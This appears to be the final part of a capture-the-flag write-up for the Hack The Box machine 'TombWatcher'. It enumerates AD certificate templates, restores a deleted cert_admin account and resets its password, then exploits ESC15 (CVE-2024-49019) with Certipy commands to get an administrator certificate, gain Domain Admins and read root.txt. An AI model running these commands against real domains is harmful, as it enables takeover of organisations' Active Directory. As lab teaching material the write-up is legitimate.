    Certificate Name Flag               : SubjectAltRequireDirectoryGuid, SubjectAltRequireDns
    Enrollment Flag                     : IncludeSymmetricAlgorithms, PublishToDs, AutoEnrollment
    Extended Key Usage                  : Directory Service Email Replication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers, TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Controllers, TOMBWATCHER.HTB\Enterprise Admins, TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Controllers, TOMBWATCHER.HTB\Enterprise Admins, TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers, TOMBWATCHER.HTB\Enterprise Domain Controllers
  2
    Template Name                       : DomainControllerAuthentication
    Display Name                        : Domain Controller Authentication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication, Server Authentication, Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers, TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Controllers, TOMBWATCHER.HTB\Enterprise Admins, TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Controllers, TOMBWATCHER.HTB\Enterprise Admins, TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers, TOMBWATCHER.HTB\Enterprise Domain Controllers
  3
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
  4
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins, S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins, S-1-5-21-1392491010-1358638721-2126982587-1111
  5
    Template Name                       : DomainController
    Display Name                        : Domain Controller
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid, SubjectAltRequireDns, SubjectRequireDnsAsCn
    Enrollment Flag                     : IncludeSymmetricAlgorithms, PublishToDs, AutoEnrollment
    Extended Key Usage                  : Client Authentication, Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers, TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Controllers, TOMBWATCHER.HTB\Enterprise Admins, TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Controllers, TOMBWATCHER.HTB\Enterprise Admins, TOMBWATCHER.HTB\Enterprise Domain Controllers
  6
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns, SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication, Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Computers, TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Computers, TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Computers
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  7
    Template Name                       : EFSRecovery
    Display Name                        : EFS Recovery Agent
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn, SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms, AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : File Recovery
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
  8
    Template Name                       : Administrator
    Display Name                        : Administrator
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn, SubjectAltRequireEmail, SubjectRequireEmail, SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms, PublishToDs, AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Microsoft Trust List Signing, Encrypting File System, Secure Email, Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
  9
    Template Name                       : EFS
    Display Name                        : Basic EFS
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn, SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms, PublishToDs, AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Users, TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Users, TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
  10
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn, SubjectAltRequireEmail, SubjectRequireEmail, SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms, PublishToDs, AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System, Secure Email, Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Users, TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Users, TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```

There's ESC2 and ESC3 helper certificates, but nothing stands out from too much output.

Get unique groups
```bash
└─$ grep -o 'TOMBWATCHER\.HTB.*' 20250715064401_Certipy.txt | sort | uniq
TOMBWATCHER.HTB\Administrators
TOMBWATCHER.HTB\Authenticated Users
TOMBWATCHER.HTB\Domain Admins
TOMBWATCHER.HTB\Domain Computers      # Pwned
TOMBWATCHER.HTB\Domain Controllers
TOMBWATCHER.HTB\Domain Users          # Pwned
TOMBWATCHER.HTB\Enterprise Admins
TOMBWATCHER.HTB\Enterprise Domain Controllers
TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
```

**Domain Users** has access to **User** template and **Domain Computers** has access to **Machine** templates, for now not vey useful.

Alongside group names there's also a SID.
```bash
└─$ grep -o 'S-1-5.*' 20250715064401_Certipy.txt | sort | uniq
S-1-5-21-1392491010-1358638721-2126982587-1111
```

```bash
  4
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins, S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins, S-1-5-21-1392491010-1358638721-2126982587-1111
```

Either this user is deleted or hidden..
```bash
└─$ bloodyAD -u 'john' -p 'Password123$' -d 'tombwatcher.htb' --host 10.10.11.72 get object S-1-5-21-1392491010-1358638721-2126982587-1111
bloodyAD.exceptions.NoResultError: [-] No object found in DC=tombwatcher,DC=htb with filter: (objectSid=S-1-5-21-1392491010-1358638721-2126982587-1111)
```

[https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adobject?view=windowsserver2025-ps](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adobject?view=windowsserver2025-ps)

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Identity "S-1-5-21-1392491010-1358638721-2126982587-1111" -IncludeDeletedObjects 
Cannot find an object with identity: 'S-1-5-21-1392491010-1358638721-2126982587-1111' under: 'DC=tombwatcher,DC=htb'.

*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -IncludeDeletedObjects # -Properties *
Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

> `-Identity` is direct lookup using a unique identifier. It must match exactly and the object must exist in a live (non-deleted) state by default, unless explicitly searched elsewhere. If the object is deleted (tombstoned), -Identity won't find it, even if you use `-IncludeDeletedObjects`.

Get the exact AD object:
```bash
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111" -and sn -eq "cert_admin"' -IncludeDeletedObjects

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

[https://learn.microsoft.com/en-us/powershell/module/activedirectory/restore-adobject?view=windowsserver2025-ps](https://learn.microsoft.com/en-us/powershell/module/activedirectory/restore-adobject?view=windowsserver2025-ps)

```bash
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf" # GUID
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111" -and sn -eq "cert_admin"' | fl
DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

[https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountpassword?view=windowsserver2025-ps](https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountpassword?view=windowsserver2025-ps)

```bash
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity 'S-1-5-21-1392491010-1358638721-2126982587-1111' -Reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password123$' -Force)

└─$ netexec ldap tombwatcher.htb -u 'cert_admin' -p 'Password123$'
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\cert_admin:Password123$
```

### ESC15

```bash
└─$ certipy-ad find -u 'cert_admin' -p 'Password123$' -dc-ip 10.10.11.72 -text -stdout -vulnerable
...
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins, TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins, TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

[https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu](https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)

```bash
└─$ faketime -f +4h certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Password123$' -dc-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

└─$ faketime -f +4h certipy-ad auth -pfx administrator.pfx -domain 'tombwatcher.htb' -dc-ip '10.10.11.72' -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*]     SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# add_user_to_group john 'Domain Admins'
Adding user: john to group Domain Admins result: OK
```

> When you update groups re-login is required for effect to take place, otherwise live user has same permissions as before.

### Root.txt

```powershell
└─$ evil-winrm -i dc01.tombwatcher.htb -u 'john' -p 'Password123$'
*Evil-WinRM* PS C:\Users\john\Documents> cat /Users/Administrator/Desktop/root.txt
991dbe0c42706d603f527581568d0da4
```
